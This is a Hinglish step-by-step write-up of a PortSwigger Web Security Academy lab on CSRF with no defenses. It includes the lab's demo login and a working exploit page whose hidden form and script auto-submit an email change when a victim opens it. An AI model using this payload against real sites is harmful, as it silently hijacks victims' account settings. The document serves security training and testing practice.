# CSRF vulnerability with no defenses

### âœ… Lab Objective:
Victim ka email bina uski marzi ke change karna using CSRF â€” kyunki koi defense nahi laga.

### ğŸ§  Pehle samajh le:
- Lab mein attacker (tum) ek malicious HTML page banayega.
- Jab victim wo page kholta hai, uska email silently change ho jata hai.
- Ye sab possible hai kyunki na CSRF token hai, na SameSite cookies.

---

### âš™ï¸ Required Tools:
- Burp Suite (Community bhi chalega)
- Lab browser
- Exploit Server (lab ke saath hota hai)

---

### ğŸ”¹ Step 1: Lab open karo & login karo
Lab open karo: CSRF vulnerability with no defenses

Burpâ€™s browser use karo (ya Firefox with Burp)

##### Login karo:
- Username: wiener  
- Password: peter

---
 
### ğŸ”¹ Step 2: â€œChange emailâ€ form ko use karo
Top menu se â€œMy accountâ€ par jao

Wahan email field dikh rahi hogi â€” usme koi bhi new email daal ke submit karo
Example: test@csrf.com

---

### ğŸ”¹ Step 3: Burp Suite mein request capture karo
Burp > Proxy > HTTP history mein jao

Us POST request ko dhoondo jo /my-account/change-email pe ja rahi ho

Us request ko select karo

Example:

```
POST /my-account/change-email HTTP/1.1  
Host: 0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net  
Cookie: session=...  
Content-Type: application/x-www-form-urlencoded
```
```email=test@csrf.com```

âœ… Note: Ismein koi CSRF token nahi hona chahiye.

### ğŸ”¹ Step 4: URL copy karo
Right-click karo us request pe â†’ Copy URL
Tumhe milega:

```https://0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net/my-account/change-email```

ğŸ“Œ Yeh URL tumhe form ke action mein lagana hai.

---

### ğŸ”¹ Step 5: Exploit HTML banao
Ab exploit server open karo:

Lab page pe â€œGo to exploit serverâ€ button dabao

Wahan body section mein yeh HTML paste karo: ğŸ‘‡

```
<form method="POST" action="https://0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@csrf123.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

âš ï¸ Make sure:

action="..." mein tumhara exact lab URL ho

email koi bhi naya unique value ho (wiener@... se different)

---

### ğŸ”¹ Step 6: Exploit HTML store karo
"Store" button dabao taake payload save ho jaye

Tumhara malicious page ab ready hai

---

### ğŸ”¹ Step 7: Exploit Deliver karo
ğŸ’¥ Ab â€œDeliver to victimâ€ button dabao

â—Yahi woh step hai jo lab ko solve karta hai â€” yeh victim ko tumhara page open karwata hai.

**âœ… Congratulations, you solved the lab!**

---

### ğŸ§  Pro Penetration Testing Tip:
Real life mein agar CSRF token nahi hote:

User ke account ka password, email, setting silently change ho sakti hain

Attacker fake bank transfer bhi kar sakta hai (agar form simple ho)

Isliye ALWAYS check for CSRF token & SameSite cookies during testing.

